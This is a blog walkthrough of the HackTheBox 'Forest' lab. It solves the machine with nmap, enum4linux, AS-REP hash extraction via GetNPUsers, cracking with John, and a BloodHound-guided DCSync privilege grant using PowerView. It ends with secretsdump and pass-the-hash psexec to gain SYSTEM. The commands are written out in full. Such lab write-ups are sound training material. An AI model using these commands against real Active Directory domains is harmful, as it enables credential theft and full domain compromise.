<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Forest HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/forest-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-21T05:59:16+00:00">January 21, 2021</time><time class="updated" datetime="2025-06-23T09:35:17+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<strong>Forest</strong>“. It’s available at HackTheBox for penetration testing practice. This laboratory is of an easy level, but with adequate basic knowledge to break the laboratories and if we pay attention to all the details we find during the examination it will not be complicated. The credit for making this lab goes to <span style="color: #0000ff;"><strong>egre55</strong> </span>&amp; <span style="color: #0000ff;"><strong>mrb3n</strong></span>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Easy</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the <strong>HackTheBox</strong> website.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Enum4linux</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Obtain user hashes with GetNPUsers</span></li>
<li><span style="color: #000000;">Cracking of hashes with JohnTheRipper</span></li>
<li><span style="color: #000000;">Evil-Winrm for connection interactive</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">BloodHound &amp; PowerView.ps1</span></li>
<li><span style="color: #000000;">Abuse of Privileges and group “Exchange Windows Permission” domain account</span></li>
<li><span style="color: #000000;">Secretsdump and Psexec as support tools</span></li>
</ul>
<ul>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
<p><span style="color: #000000;">We will use the following command to perform a quick scan to all ports.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap --min-rate 5000 -p- -Pn -n -sS -T5 10.XX.XX.XX</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gh8hgORJViw/YAkVQrE99eI/AAAAAAAAtG4/PPzJYCbqkSw3YCXzu7h-XXcl6iqQo0EwACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Afterwards, we will launch another scan with scripts and versions, it will be very fast since we will specify the ports of the previously detected services.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NliDX0i9sA4/YAkVVlIs5rI/AAAAAAAAtG8/hAUN2CQO0YsKciXKPfvc5i2TqSCj3gDqwCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We launched the “<strong>enum4linux</strong>” tool and among the information that it shows us, we manage to list the users.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">enum4linux 10.XX.XX.XX</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FmU0xLHf-mE/YAkVcKve_LI/AAAAAAAAtHA/zIi8n8EdurEvdOS1RF-L2GyUpefAtG5EQCLcBGAsYHQ/s16000/3.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
<p><span style="color: #000000;">We will use the “<strong>GetNPUsers</strong>” utility that will allow us to obtain the encrypted passwords of the domain users. These will be extracted to the file “<strong>hashes-domain-users.txt</strong>“.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">GetNPUsers htb.local/ -usersfile domain-users.txt -outputfile hashes-domain-users.txt -dc-ip 10.XX.XX.XX</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OYeBpgivLBw/YAkVh2w8k7I/AAAAAAAAtHI/bt3UJkIyy2U7lXojguLHuDhAITYPiV7lwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Content of the file “hashes-domain-users.txt:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eTPoxwdJjNE/YAkVnbP4AOI/AAAAAAAAtHQ/jKugFxtE0pgk6amYa1arou_Mv53ZeTitACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We use “<strong>John</strong>” with the “<strong>rockyou</strong>” dictionary and will manage to obtain the clear password of the domain user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/root/Tools/Dic/rockyou.txt hashes-domain-users.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9XynGOxsJxU/YAkVsGayR6I/AAAAAAAAtHU/JOC8rv1MEPY-I7jtbc__te9XUjGeM0GTwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Then, we access the Windows system with the credentials obtained with an interactive connection through “<strong>Evil-Winrm</strong>“. We check the privileges of our user and read the flag of user.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5ySzPm3OnjQ/YAkVxImYcZI/AAAAAAAAtHY/USpl7uVMK10YakGbelISx7meQCKpWPowwCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">After an exhaustive enumeration, we did not find anything that could help us to escalate privileges as an administrator. Remember that the machine is called “<strong>Forest</strong>“, so the essence should be in the Active Directory.</span></p>
<p><span style="color: #000000;">And what tool do we have that could be great for us? That’s right! </span></p>
<h5><span style="color: #000000;"><span style="text-decoration: underline;"><span style="color: #0000ff; text-decoration: underline;"><strong><a style="color: #0000ff; text-decoration: underline;" href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a></strong></span></span>!</span></h5>
<p><span style="color: #000000;">We download the github, upload the “<strong>SharpHound.exe</strong>” collector and run it on the victim machine.</span></p>
<p><span style="color: #000000;">You have more information about the installation and operation of <strong><a style="color: #000000;" href="https://bloodhound.readthedocs.io/en/latest/index.html"><span style="text-decoration: underline; color: #0000ff;">Bloodhound here</span></a></strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\SharpHound.exe --CollectionMethod All</pre>
<p><span style="color: #000000;">Once finished, we download the .zip file to our machine, so we can load it into our Bloodhound.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9httYv5Ozvw/YAkV5WHZohI/AAAAAAAAtHg/U5Cknbkn7MMZsE3Aik-11s4buJ6LEuJQgCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We look for our user and we use the query “<strong>Shorts Paths to Domain Admins from Owner Principals</strong>“, we see the way and we check that belonging to the group “<strong>EXCHANGE WINDOWS PERMISSIONS</strong>” we could use “<strong>WriteDacl</strong>” that would allow us to add users as members of the group “<strong>Domains Admin</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IiGADeGHR9U/YAkV_cfWFPI/AAAAAAAAtHo/LfpsVkYykP4nG4_yFjrfTVmBNTyO1L_xwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">In the help of Bloodhound already gives us the steps to follow, first we will create a user and put it in the domain. (yes, my password is super secure)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xFXERR_YfRc/YAkWEjKDpmI/AAAAAAAAtHs/mfA6R4ibXpEX6O_n0HAVrV4oSJ6uxlENQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We put our new user in the group “<strong>Exchange Windows Permissions</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-va9abD150PE/YAkWJ4j27EI/AAAAAAAAtH0/HUrHH_XDrLoCZSoA_N92GmXQU1cd4LybQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Now we will have to download on the victim machine the script “<strong><a style="color: #000000;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a></strong>” and then execute the following commands. (Execute the last two, sometimes it is necessary to specify a target in a different way)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Ps&gt; $SecPassword = ConvertTo-SecureString 'M3n0s.2021' -AsPlainText -Force
Ps&gt; $Cred = New-Object System.Management.Automation.PSCredential('htb\m3n0sd0n4ld', $SecPassword)
Ps&gt; Add-DomainObjectAcl -Credentials $Cred – TargetIdentity htb.local -PrincipalIdentity m3n0sd0n4ld -Rights DCSync
Ps&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity m3n0sd0n4ld -Rights DCSync</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cdBiM6Dh2tY/YAkWSnwT45I/AAAAAAAAtH8/7S2QqxbQWQ8LLCP8SN1q-2xFf8e0_VPOgCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">If everything went well, we can run “<strong>secretsdump</strong>” and get the NTLM hash of the user “<strong>Administrator</strong>“. As you know, we don’t need to crack the hash, since we can use it to do passthehash and authenticate without knowing the password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gvEqJ07WMtQ/YAkWZTdE07I/AAAAAAAAtIE/BF5t7lYSJsk4nlONxSbWuI61gTGfDXQjwCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">With the NTML hash of the user “<strong>administrator</strong>” in our possession, we execute the following command and we will be “<strong>nt authority\system</strong>” and we will be able to read the root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">psexec administrator@10.XX.XX.XX -hashes NTLM:NTLM</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mWJ-elrsQ0k/YAkWgbXo-_I/AAAAAAAAtIM/61IEPJA3btUExug7ZSY7cXKGzNAsGmFnACLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contact on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
